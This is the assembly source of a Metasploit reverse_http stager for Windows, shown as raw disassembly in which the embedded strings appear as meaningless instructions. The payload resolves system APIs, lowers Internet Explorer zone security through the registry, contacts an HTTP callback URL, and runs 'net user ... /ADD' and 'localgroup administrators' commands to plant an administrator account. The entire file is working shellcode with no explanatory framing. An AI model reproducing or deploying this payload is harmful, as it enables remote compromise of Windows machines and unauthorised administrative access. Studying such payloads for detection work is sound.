;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for reverse_http (stager)
;
; Authors: hdm <hdm@metasploit.com>, vlad902 <vlad902@gmail.com>, skape <mmiller@hick.org>
; Size   : 553
;

cld
call 0xab
push ebx
outsd
o16 jz 0x82
popa
jc 0x73
pop esp
dec ebp
imul esp,[ebx+0x72],dword 0x666f736f
jz 0x75
push edi
imul ebp,[esi+0x64],dword 0x5c73776f
inc ebx
jnz 0x96
jc 0x8b
outsb
jz 0x7f
gs jc 0x9f
imul ebp,[edi+0x6e],dword 0x746e495c
gs jc 0xa4
gs jz 0x59
push ebx
gs jz 0xb1
imul ebp,[esi+0x67],dword 0x6f5a5c73
outsb
gs jnc 0xa4
xor eax,[eax]
xor [eax],esi
xor [ecx+esi],dh
xor dh,[eax]
xor [ecx],dh
xor dh,[eax]
xor [ecx],esi
xor [eax],dh
xor [ebx+0x3a],eax
pop esp
jo 0xd1
outsd
a16 jc 0xc4
jng 0x96
pop esp
imul ebp,[esi+0x74],dword 0x7e6e7265
xor [ecx+ebp*2+0x65],ebx
js 0xe3
insb
outsd
jc 0xdc
and [0x2077656e],ch
push dword 0x3a707474
das
das
cmp bh,[eax]
xor [eax],bh
xor [edi],ch
inc ecx
outsb
inc ecx
xor [edi+0x31],cl
dec ecx
dec edi
outsd
push byte +0x68
push ebx
push byte +0x62
cmp [edx+0x43],esi
a16 js 0x115
jno 0xd6
cmp [ecx],esi
insd
inc esp
jnz 0x10d
pop edx
outsb
jno 0xf4
add al,ch
dec esi
add [eax],al
add [eax-0x75],ah
insb
and al,0x24
mov eax,[ebp+0x3c]
mov edi,[ebp+eax+0x78]
add edi,ebp
mov ecx,[edi+0x18]
mov ebx,[edi+0x20]
add ebx,ebp
jecxz 0xfa
dec ecx
mov esi,[ebx+ecx*4]
add esi,ebp
xor eax,eax
cdq
lodsb
test al,al
jz 0xdd
ror edx,0xd
add edx,eax
jmp short 0xd1
cmp edx,[esp+0x28]
jnz 0xc6
mov ebx,[edi+0x24]
add ebx,ebp
mov cx,[ebx+ecx*2]
mov ebx,[edi+0x1c]
add ebx,ebp
mov eax,[ebx+ecx*4]
add eax,ebp
mov [esp+0x1c],eax
popa
ret 0x8
pop edi
pop ebx
xor edx,edx
mov eax,[fs:edx+0x30]
test eax,eax
js 0x116
mov eax,[eax+0xc]
mov esi,[eax+0x1c]
lodsd
mov eax,[eax+0x8]
jmp short 0x11f
mov eax,[eax+0x34]
add eax,byte +0x7c
mov eax,[eax+0x3c]
mov ebp,esp
push dword 0x5f048af0
push eax
push dword 0x16b3fe72
push eax
push dword 0xec0e4e8e
push eax
call edi
xchg eax,esi
call edi
mov [ebp+0x0],eax
call edi
mov [ebp+0x4],eax
push edx
push dword 0x32336970
push dword 0x61766461
push esp
call esi
push dword 0x2922ba9
push eax
push dword 0x2d1c9add
push eax
call edi
mov [ebp+0x8],eax
call edi
xchg eax,edi
xchg esi,ebx
push esp
push esi
push dword 0x80000001
call edi
pop ebx
add esi,byte +0x44
push eax
mov edi,esp
cmp byte [esi],0x43
jz 0x194
push eax
lodsd
push eax
mov eax,esp
push byte +0x4
push edi
push byte +0x4
push byte +0x0
push eax
push ebx
call near [ebp+0x8]
jmp short 0x174
mov cl,[0x7ffe0030]
mov [esi],cl
push byte +0x54
pop ecx
sub esp,ecx
mov edi,esp
push edi
rep stosb
pop edi
mov byte [edi],0x44
inc byte [edi+0x2c]
inc byte [edi+0x2d]
push dword 0x746c75
push dword 0x61666544
push dword 0x5c306174
push dword 0x536e6957
mov [edi+0x8],esp
lea ebx,[edi+0x44]
push ebx
push edi
push eax
push eax
push byte +0x10
push eax
push eax
push eax
push esi
push eax
call near [ebp+0x0]
call near [ebp+0x4]
arpl [ebp+0x64],bp
gs js 0x23f
and [edi],ch
arpl [eax],sp
outsb
gs jz 0x202
jnz 0x257
gs jc 0x207
insd
gs jz 0x24c
jnc 0x25d
insb
outsd
imul esi,[eax+0x20],dword 0x4444412f
and [esi],ah
and [es:esi+0x65],ch
jz 0x21f
insb
outsd
arpl [ecx+0x6c],sp
a16 jc 0x276
jnz 0x279
and [ecx+0x64],al
insd
imul ebp,[esi+0x69],dword 0x61727473
jz 0x285
jc 0x28b
and [ebp+0x65],ch
jz 0x27e
jnc 0x28f
insb
outsd
imul esi,[eax+0x2f],dword 0x444441
